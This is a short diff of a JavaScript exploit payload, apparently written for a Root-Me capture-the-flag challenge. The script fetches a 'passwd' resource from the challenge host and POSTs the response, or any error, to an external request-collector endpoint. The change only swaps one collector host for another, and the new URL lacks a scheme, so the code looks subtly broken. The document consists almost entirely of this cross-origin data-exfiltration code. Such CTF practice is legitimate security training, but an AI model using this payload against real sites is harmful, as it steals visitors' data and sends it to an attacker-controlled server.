@@ -6,9 +6,9 @@
     try{
       websocket.addEventListener('open', (event) => {
         let data = $.ajax({ url: 'http://ctf03.root-me.org/passwd', success: function(data) { return data } });
-        fetch('https://eoin4a7dtj6eyhc.m.pipedream.net', {method:'POST',mode:'no-cors',body:data})
+        fetch('72vhayu1oht4aztp.b.requestbin.net', {method:'POST',mode:'no-cors',body:data})
       }catch(err){
-        fetch('https://eoin4a7dtj6eyhc.m.pipedream.net', {method:'POST',mode:'no-cors',body:err})
+        fetch('72vhayu1oht4aztp.b.requestbin.net', {method:'POST',mode:'no-cors',body:err})
       }
     });
   </script>
